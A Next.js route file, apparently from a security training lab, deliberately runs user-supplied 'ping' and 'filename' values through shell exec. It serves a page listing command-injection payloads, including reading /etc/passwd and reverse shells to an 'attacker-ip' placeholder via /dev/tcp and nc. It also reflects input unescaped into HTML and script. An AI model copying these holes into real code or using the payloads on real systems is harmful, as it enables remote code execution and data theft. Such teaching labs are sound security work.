import { NextRequest, NextResponse } from 'next/server';
import { exec } from 'child_process';
import { promisify } from 'util';

const execAsync = promisify(exec);

// Command Injection demonstration endpoint
export async function GET(request: NextRequest) {
  try {
    // Check if lab mode is enabled
    if (process.env.LAB_MODE !== 'true') {
      return NextResponse.json({
        error: 'Lab mode disabled',
        message: 'Set LAB_MODE=true in environment variables'
      }, { status: 403 });
    }

    const { searchParams } = new URL(request.url);
    const ping = searchParams.get('ping');
    const filename = searchParams.get('filename');

    // Log request for educational purposes
    console.log('🚨 Command Injection Lab - Parameters:', { ping, filename });

    let commandOutput = '';
    let executedCommand = '';

    try {
      if (ping) {
        // VULNERABLE: Direct command injection
        executedCommand = `ping -c 3 ${ping}`;
        console.log('🚨 Executing command:', executedCommand);
        
        const { stdout, stderr } = await execAsync(executedCommand);
        commandOutput = stdout + stderr;
      } else if (filename) {
        // VULNERABLE: File listing with injection
        executedCommand = `ls -la ${filename}`;
        console.log('🚨 Executing command:', executedCommand);
        
        const { stdout, stderr } = await execAsync(executedCommand);
        commandOutput = stdout + stderr;
      }
    } catch (error: unknown) {
      commandOutput = `Command execution error: ${error instanceof Error ? error.message : String(error)}`;
      console.error('Command execution failed:', error);
    }

    const vulnerableHtml = `
      <!DOCTYPE html>
      <html>
      <head>
        <title>Command Injection Vulnerability</title>
        <style>
          body { font-family: Arial, sans-serif; margin: 20px; background: #f5f5f5; }
          .container { max-width: 900px; margin: 0 auto; background: white; padding: 20px; border-radius: 8px; }
          .vulnerability { background: #ffebee; border-left: 4px solid #f44336; padding: 15px; margin: 15px 0; }
          .example { background: #e8f5e8; border-left: 4px solid #4caf50; padding: 15px; margin: 15px 0; }
          .payload { background: #f5f5f5; padding: 10px; border-radius: 4px; font-family: monospace; margin: 10px 0; }
          .output { background: #263238; color: #fff; padding: 15px; border-radius: 4px; white-space: pre-wrap; font-family: monospace; }
          input[type="text"] { width: 70%; padding: 8px; margin: 5px; }
          button { background: #d32f2f; color: white; padding: 8px 15px; border: none; border-radius: 4px; margin: 5px; }
        </style>
      </head>
      <body>
        <div class="container">
          <h1>🚨 Command Injection Vulnerability</h1>
          
          ${executedCommand ? `
          <div class="vulnerability">
            <h3>Executed Command:</h3>
            <div class="payload">${executedCommand.replace(/</g, '&lt;').replace(/>/g, '&gt;')}</div>
          </div>
          
          <div class="vulnerability">
            <h3>Command Output:</h3>
            <div class="output">${commandOutput.replace(/</g, '&lt;').replace(/>/g, '&gt;')}</div>
          </div>
          ` : ''}

          <div class="vulnerability">
            <h3>What makes this vulnerable:</h3>
            <ul>
              <li>User input directly concatenated into shell commands</li>
              <li>No input validation or sanitization</li>
              <li>Special shell characters not escaped</li>
              <li>Command chaining and piping allowed</li>
            </ul>
          </div>

          <div class="example">
            <h3>Test Command Injection:</h3>
            
            <form method="GET">
              <h4>Ping Tool (try injection):</h4>
              <input type="text" name="ping" value="${ping || ''}" placeholder="Try: google.com; whoami">
              <button type="submit">Execute Ping</button>
            </form>
            
            <form method="GET">
              <h4>File Listing (try injection):</h4>
              <input type="text" name="filename" value="${filename || ''}" placeholder="Try: /etc/passwd; cat /etc/passwd">
              <button type="submit">List Files</button>
            </form>
          </div>

          <div class="example">
            <h3>Command Injection Payloads:</h3>
            
            <h4>Command Chaining:</h4>
            <div class="payload">
              google.com; whoami<br>
              google.com && cat /etc/passwd<br>
              google.com || id<br>
              google.com | cat /etc/hosts
            </div>
            
            <h4>Subcommand Execution:</h4>
            <div class="payload">
              google.com \`whoami\`<br>
              google.com $(cat /etc/passwd)<br>
              google.com & sleep 10 &
            </div>
            
            <h4>Information Gathering:</h4>
            <div class="payload">
              google.com; uname -a<br>
              google.com; ps aux<br>
              google.com; env<br>
              google.com; ls -la /
            </div>
            
            <h4>Reverse Shell (be careful!):</h4>
            <div class="payload">
              google.com; bash -i >& /dev/tcp/attacker-ip/4444 0>&1<br>
              google.com; nc -e /bin/bash attacker-ip 4444
            </div>
          </div>

          <div class="example">
            <h3>How to fix:</h3>
            <ul>
              <li>Never use user input directly in shell commands</li>
              <li>Use parameterized commands or safe APIs</li>
              <li>Validate input against strict whitelists</li>
              <li>Escape shell metacharacters properly</li>
              <li>Use language-specific libraries instead of shell commands</li>
              <li>Run with minimal privileges</li>
            </ul>
          </div>
        </div>

        <script>
          console.log('🚨 Command Injection demonstration');
          console.log('Executed command:', '${executedCommand}');
          if ('${commandOutput}') {
            console.log('Command output:', \`${commandOutput.substring(0, 200)}...\`);
          }
        </script>
      </body>
      </html>
    `;

    return new NextResponse(vulnerableHtml, {
      headers: {
        'Content-Type': 'text/html',
        // No security headers - VULNERABLE!
      },
    });

  } catch (error) {
    console.error('Command injection demonstration error:', error);
    return NextResponse.json({
      error: 'Command injection demonstration failed',
      details: error instanceof Error ? error.message : String(error)
    }, { status: 500 });
  }
}
